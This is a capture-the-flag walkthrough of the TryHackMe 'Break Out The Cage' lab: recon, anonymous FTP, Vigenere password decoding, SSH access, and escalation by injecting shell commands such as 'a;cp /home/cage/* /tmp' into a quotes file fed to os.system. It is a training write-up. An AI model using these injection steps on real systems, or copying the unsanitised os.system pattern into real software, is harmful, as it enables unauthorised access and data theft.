# Break Out The Cage

URL: https://tryhackme.com/room/breakoutthecage1

Level: Easy

Date: 23 Jul 2023

- [Reconnaissance](#reconnaissance)
	- [NMAP](#nmap)
	- [HTTP](#http)
	- [FTP](#ftp)
	- [Dad Task](#dad-task)
	- [Rabbit Hole](#rabbit-hole)
	- [SSH access](#ssh-access)
	- [Broadcast messages](#broadcast-messages)
	- [Bees script](#bees-script)
	- [Local Enum](#local-enum)
	- [Fun with Python](#fun-with-python)
	
- [User flag](#user-flag)
- [Privilege Escalation](#privesc)





## Reconnaissance

### nmap

```bash
$ sudo nmap -T4 -p- 10.10.230.13 -oN nmap
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-23 15:36 CEST
Nmap scan report for 10.10.230.13
Host is up (0.057s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 72.47 seconds
```

```bash
$ sudo nmap -T4 -p21,80 -sC -sV  10.10.230.13 -oN nmap2
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-23 15:37 CEST
Nmap scan report for 10.10.230.13
Host is up (0.056s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:10.8.100.14
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0             396 May 25  2020 dad_tasks
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Nicholas Cage Stories
Service Info: OS: Unix

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.05 seconds

```

### http

![](Pasted%20image%2020230723160711.png)

### ftp

```bash
$ ftp 10.10.230.13
Connected to 10.10.230.13.
220 (vsFTPd 3.0.3)
Name (10.10.230.13:joshua): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> dir
229 Entering Extended Passive Mode (|||63859|)
150 Here comes the directory listing.
-rw-r--r--    1 0        0             396 May 25  2020 dad_tasks
226 Directory send OK.
ftp> get dad_tasks
local: dad_tasks remote: dad_tasks
229 Entering Extended Passive Mode (|||23465|)
150 Opening BINARY mode data connection for dad_tasks (396 bytes).
100% |*************************************************************************************************************************************************|   396        4.58 KiB/s    00:00 ETA
226 Transfer complete.
396 bytes received in 00:00 (2.43 KiB/s)
ftp> quit
221 Goodbye.
```

### dad task

```bash
$ cat dad_tasks
UWFwdyBFZWtjbCAtIFB2ciBSTUtQLi4uWFpXIFZXVVIuLi4gVFRJIFhFRi4uLiBMQUEgWlJHUVJPISEhIQpTZncuIEtham5tYiB4c2kgb3d1b3dnZQpGYXouIFRtbCBma2ZyIHFnc2VpayBhZyBvcWVpYngKRWxqd3guIFhpbCBicWkgYWlrbGJ5d3FlClJzZnYuIFp3ZWwgdnZtIGltZWwgc3VtZWJ0IGxxd2RzZmsKWWVqci4gVHFlbmwgVnN3IHN2bnQgInVycXNqZXRwd2JuIGVpbnlqYW11IiB3Zi4KCkl6IGdsd3cgQSB5a2Z0ZWYuLi4uIFFqaHN2Ym91dW9leGNtdndrd3dhdGZsbHh1Z2hoYmJjbXlkaXp3bGtic2lkaXVzY3ds
```

base64 decode:

```bash
$ cat dad_tasks  | base64 -d
Qapw Eekcl - Pvr RMKP...XZW VWUR... TTI XEF... LAA ZRGQRO!!!!
Sfw. Kajnmb xsi owuowge
Faz. Tml fkfr qgseik ag oqeibx
Eljwx. Xil bqi aiklbywqe
Rsfv. Zwel vvm imel sumebt lqwdsfk
Yejr. Tqenl Vsw svnt "urqsjetpwbn einyjamu" wf.

Iz glww A ykftef.... Qjhsvbouuoexcmvwkwwatfllxughhbbcmydizwlkbsidiuscwl
```

### rabbit hole

Sounds like a *checklist*

```
One...
Two...
Three...
...
```

We waste some time with `rot13`, `rot47`, try some substitution with

https://gchq.github.io/

We search for "cipher guesser" and we found this:

https://www.boxentriq.com/code-breaking/cipher-identifier

and we found that probably we are facing Vigenere cipher:

![](Pasted%20image%2020230723160509.png)

We use this site:

https://www.guballa.de/vigenere-solver

and we found cleartext:

```
Dads Tasks - The RAGE...THE CAGE... THE MAN... THE LEGEND!!!!
One. Revamp the website
Two. Put more quotes in script
Three. Buy bee pesticide
Four. Help him with acting lessons
Five. Teach Dad what "information security" is.

In case I forget.... Mydadisghostrideraintthatcoolnocausehesonfirejokes

```

### ssh access

```bash
$ ssh weston@10.10.230.13
The authenticity of host '10.10.230.13 (10.10.230.13)' can't be established.
ED25519 key fingerprint is SHA256:o7pzAxWHDEV8n+uNpDnQ+sjkkBvKP3UVlNw2MpzspBw.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.230.13' (ED25519) to the list of known hosts.
weston@10.10.230.13's password:
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-101-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sun Jul 23 13:48:12 UTC 2023

  System load:  0.0                Processes:           89
  Usage of /:   20.3% of 19.56GB   Users logged in:     0
  Memory usage: 31%                IP address for eth0: 10.10.230.13
  Swap usage:   0%


39 packages can be updated.
0 updates are security updates.


         __________
        /\____;;___\
       | /         /
       `. ())oo() .
        |\(%()*^^()^\
       %| |-%-------|
      % \ | %  ))   |
      %  \|%________|
       %%%%
Last login: Tue May 26 10:58:20 2020 from 192.168.247.1
weston@national-treasure:~$
```

There is no `user.txt` in our home directory.

We noticed that we belong to group "cage":

```bash
weston@national-treasure:~$ id
uid=1001(weston) gid=1001(weston) groups=1001(weston),1000(cage)
```

which is another user on system:

```bash
weston@national-treasure:~$ ls /home/
cage  weston
weston@national-treasure:~$ grep cage /etc/passwd
cage:x:1000:1000:cage:/home/cage:/bin/bash
```

### broadcast messages

We also notice message on our console, with random quotes:

```bash
Broadcast message from cage@national-treasure (somewhere) (Sun Jul 23 14:06:01
What's that like? What's it taste like? Describe it like Hemingway. — City of Angels

Broadcast message from cage@national-treasure (somewhere) (Sun Jul 23 14:09:01
If you dress like Halloween, ghouls will try to get in your pants. — Face/Off
```

We also notice `sudo` entry:

```bash
weston@national-treasure:~$ sudo -l
[sudo] password for weston:
Matching Defaults entries for weston on national-treasure:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User weston may run the following commands on national-treasure:
    (root) /usr/bin/bees
weston@national-treasure:~$
```


### bees script

```bash
weston@national-treasure:~$ sudo /usr/bin/bees

Broadcast message from weston@national-treasure (pts/0) (Sun Jul 23 14:10:12 20

AHHHHHHH THEEEEE BEEEEESSSS!!!!!!!!

weston@national-treasure:~$ cat /usr/bin/bees
#!/bin/bash

wall "AHHHHHHH THEEEEE BEEEEESSSS!!!!!!!!"
weston@national-treasure:~$
```

### local enum

let's find files owned by `cage`:

```bash
weston@national-treasure:~$ find / -type f -user cage 2>/dev/null
/opt/.dads_scripts/spread_the_quotes.py
/opt/.dads_scripts/.files/.quotes
```

```python
weston@national-treasure:~$ cat /opt/.dads_scripts/spread_the_quotes.py
#!/usr/bin/env python

#Copyright Weston 2k20 (Dad couldnt write this with all the time in the world!)
import os
import random

lines = open("/opt/.dads_scripts/.files/.quotes").read().splitlines()
quote = random.choice(lines)
os.system("wall " + quote)

```

```bash
weston@national-treasure:~$ head /opt/.dads_scripts/.files/.quotes
"That's funny, my name's Roger. Two Rogers don't make a right!" — Gone in Sixty Seconds
"Did I ever tell ya that this here jacket represents a symbol of my individuality, and my belief in personal freedom?" — Wild at Heart
"Well, I'm one of those fortunate people who like my job, sir. Got my first chemistry set when I was seven, blew my eyebrows off, we never saw the cat again, been into it ever since." — The Rock
"Put... the bunny... back... in the box." — Con Air
"Sorry boss, but there's only two men I trust. One of them's me. The other's not you." — Con Air
"What's in the bag? A shark or something?" — The Wicker Man
"Only if it's a noun, and the words have equal weight. Like, Homeland Security. If it's a participle modifying the first word, then... you better keep it lower case." — Seeking Justice
"What do you think I'm gonna do? I'm gonna save the ' ****** day!" — Con Air
"Guns and wine. Naughty priests." — Ghost Rider: Spirit of Vengeance
Hey! My mama lives in a trailer!" — Con Air
```

So, our guess is that there is some scheduled call to `spread_the_quotes.py` script every 3 minutes, which calls `/usr/bin/wall` with an argument (one random quote)

We have write permission on quote file, since we are in `cage` group:

```bash
weston@national-treasure:~$ ls -lh /opt/.dads_scripts/.files/.quotes
-rwxrw---- 1 cage cage 4.2K May 25  2020 /opt/.dads_scripts/.files/.quotes
```


### Fun with Python

Let's *fuzz* quote file and do some test:

```bash
echo "/etc/passwd" > /opt/.dads_scripts/.files/.quotes
```

```bash
weston@national-treasure:~$ python3 script.py
wall: will not read /etc/passwd - use stdin.
```

```bash
weston@national-treasure:~$ echo "$(cat /etc/passwd)" > /opt/.dads_scripts/.files/.quotes
```

After a while, we get this:

```bash
Broadcast message from cage@national-treasure (somewhere) (Sun Jul 23 14:18:01
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
```

Let's try command injection:


```bash
weston@national-treasure:~$ cp /opt/.dads_scripts/spread_the_quotes.py ./script.py
weston@national-treasure:~$ chmod +x ./script.py
weston@national-treasure:~$ ./script.py

Broadcast message from weston@national-treasure (pts/0) (Sun Jul 23 16:09:46 20

a

uid=1001(weston) gid=1001(weston) groups=1001(weston),1000(cage)
```

Let's explore cage's home:

```bash
$ echo "a;ls /home/cage > /tmp/asd.txt" > /opt/.dads_scripts/.files/.quotes


weston@national-treasure:~$ cat /tmp/asd.txt
email_backup
Super_Duper_Checklist
```

## User flag

```bash
weston@national-treasure:~$ echo "a;cp /home/cage/* /tmp" > /opt/.dads_scripts/.files/.quotes

weston@national-treasure:~$ cat /tmp/Super_Duper_Checklist
1 - Increase acting lesson budget by at least 30%
2 - Get Weston to stop wearing eye-liner
3 - Get a new pet octopus
4 - Try and keep current wife
5 - Figure out why Weston has this etched into his desk: THM{M37AL_0R_P3N_XXXXXXX}
```

## privesc

Let's explore the three email message in `/home/cage/email_backup` folder:

```bash
$ echo "a;cp -r /home/cage/email_backup /tmp/" > /opt/.dads_scripts/.files/.quotes
```

```
weston@national-treasure:/tmp/email_backup$ cat email_1
From - SeanArcher@BigManAgents.com
To - Cage@nationaltreasure.com

Hey Cage!

There's rumours of a Face/Off sequel, Face/Off 2 - Face On. It's supposedly only in the
planning stages at the moment. I've put a good word in for you, if you're lucky we
might be able to get you a part of an angry shop keeping or something? Would you be up
for that, the money would be good and it'd look good on your acting CV.

Regards

Sean Archer
```

```
weston@national-treasure:/tmp/email_backup$ cat email_2
From - Cage@nationaltreasure.com
To - SeanArcher@BigManAgents.com

Dear Sean

We've had this discussion before Sean, I want bigger roles, I'm meant for greater things.
Why aren't you finding roles like Batman, The Little Mermaid(I'd make a great Sebastian!),
the new Home Alone film and why oh why Sean, tell me why Sean. Why did I not get a role in the
new fan made Star Wars films?! There was 3 of them! 3 Sean! I mean yes they were terrible films.
I could of made them great... great Sean.... I think you're missing my true potential.

On a much lighter note thank you for helping me set up my home server, Weston helped too, but
not overally greatly. I gave him some smaller jobs. Whats your username on here? Root?

Yours

Cage

```

```
weston@national-treasure:/tmp/email_backup$ cat email_3
From - Cage@nationaltreasure.com
To - Weston@nationaltreasure.com

Hey Son

Buddy, Sean left a note on his desk with some really strange writing on it. I quickly wrote
down what it said. Could you look into it please? I think it could be something to do with his
account on here. I want to know what he's hiding from me... I might need a new agent. Pretty
sure he's out to get me. The note said:

haiinspsyanileph

The guy also seems obsessed with my face lately. He came him wearing a mask of my face...
was rather odd. Imagine wearing his ugly face.... I wouldnt be able to FACE that!!
hahahahahahahahahahahahahahahaahah get it Weston! FACE THAT!!!! hahahahahahahhaha
ahahahhahaha. Ahhh Face it... he's just odd.

Regards

The Legend - Cage
```

This time we got another string: `haiinspsyanileph`

There are several reference to "FACE" in last email.

We can try to decode string with that key with CyberChef:

![](Pasted%20image%2020230723184907.png)

Now we are able to login as `root`:


```bash
weston@national-treasure:/tmp$ su -
Password:
root@national-treasure:~# ls
email_backup
root@national-treasure:~# pwd
/root

```

We get another `email_backup` folder, let's explore content:

```
root@national-treasure:~/email_backup# cat email_1
From - SeanArcher@BigManAgents.com
To - master@ActorsGuild.com

Good Evening Master

My control over Cage is becoming stronger, I've been casting him into worse and worse roles.
Eventually the whole world will see who Cage really is! Our masterplan is coming together
master, I'm in your debt.

Thank you

Sean Archer

```

```
root@national-treasure:~/email_backup# cat email_2
From - master@ActorsGuild.com
To - SeanArcher@BigManAgents.com

Dear Sean

I'm very pleased to here that Sean, you are a good disciple. Your power over him has become
strong... so strong that I feel the power to promote you from disciple to crony. I hope you
don't abuse your new found strength. To ascend yourself to this level please use this code:

THM{8R1NG_D0WN_7H3_C493_L0N9XXXXXXXXXXXXXX}

Thank you

Sean Archer

```